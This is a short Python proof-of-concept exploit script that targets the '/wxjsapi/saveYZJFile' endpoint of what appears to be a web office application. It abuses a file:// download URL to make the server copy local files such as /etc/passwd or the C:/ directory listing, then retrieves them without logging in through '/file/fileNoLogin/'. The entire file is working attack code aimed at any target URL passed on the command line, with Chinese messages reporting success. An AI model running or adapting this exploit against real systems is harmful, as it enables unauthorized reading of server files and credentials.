#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"}

def check(url):
    r = requests.get(url, headers=burp0_headers, verify=False)
    if r.status_code == 200 and "name" in r.json():
        return r.json()["id"]
    return ""

def verify(site):
    win_url = site + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt"
    lin_url = site + "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
    
    rid = check(win_url)
    if rid != "":
        url = site + "/file/fileNoLogin/" + rid
        return requests.get(url, headers=burp0_headers, verify=False).text
    
    rid = check(lin_url)
    if rid != "":
        url = site + "/file/fileNoLogin/" + rid
        return requests.get(url, headers=burp0_headers, verify=False).text

    return ""

    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，获取到的内容为：", info)
    else:
        print("[-]漏洞不存在")
